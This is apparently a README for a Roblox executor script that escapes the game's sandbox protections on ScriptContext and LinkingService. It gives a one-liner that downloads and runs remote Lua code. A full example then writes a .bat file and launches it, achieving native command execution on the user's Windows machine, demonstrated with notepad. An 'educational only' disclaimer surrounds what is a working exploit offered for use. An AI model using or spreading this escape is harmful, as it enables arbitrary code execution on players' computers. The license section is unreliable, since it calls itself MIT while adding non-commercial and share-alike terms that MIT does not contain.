# Education and Vulnerability Fix Purposes Only!

This repository is created for **educational purposes** and to help developers fix vulnerabilities in their code. The tools and scripts provided here are intended for use in **secure environments** only.

Currently, this is made to bypass **ENV** that are protected from vulnerabilities like `game:GetService("ScriptContext"):SaveScriptProfilingData` and `game:GetService("LinkingService"):OpenUrl`.

# Usage

To use this script, simply execute the following code in your Roblox executor:

```Lua
local bypassed_env = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
```

Full example:
```Lua
local bypassed_env, why, why_full = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()

if why ~= "Failed" and why ~= "UnSupported" then
    local L, S = bypassed_env.game:GetService("LinkingService"), bypassed_env.game:GetService("ScriptContext")
    L:OpenUrl(S:SaveScriptProfilingData([[START C:\WINDOWS\system32\notepad.exe]], "lol.bat"))
elseif why_full ~= nil then
    print(why_full)
else
    print(why)
end
```

## Disclaimer

By using this code, you are fully responsible for your actions. The author does not take any responsibility for any misuse or consequences resulting from the use of this code.

This project is **not** intended for malicious activities. It is solely designed to **educate** and **assist in fixing vulnerabilities** in a safe, responsible, and ethical manner.

Please ensure that you are in full compliance with all applicable laws and guidelines in your jurisdiction before using any code from this repository.

# License

This project is licensed under the **MIT License** with the following additional restriction:

## Terms:

- **Attribution**: You must give appropriate credit to the original author(s), provide a link to the license, and indicate if changes were made. You may do this in any reasonable manner, but not in any way that suggests the author(s) endorse you or your use.
- **Non-Commercial**: You may not use the material for commercial purposes. **Please do not sell the code or use it to create products or services that are sold.**
- **ShareAlike**: If you modify or build upon the work, you must distribute your contributions under the same license.

For more details, see the full [MIT License](https://opensource.org/licenses/MIT).
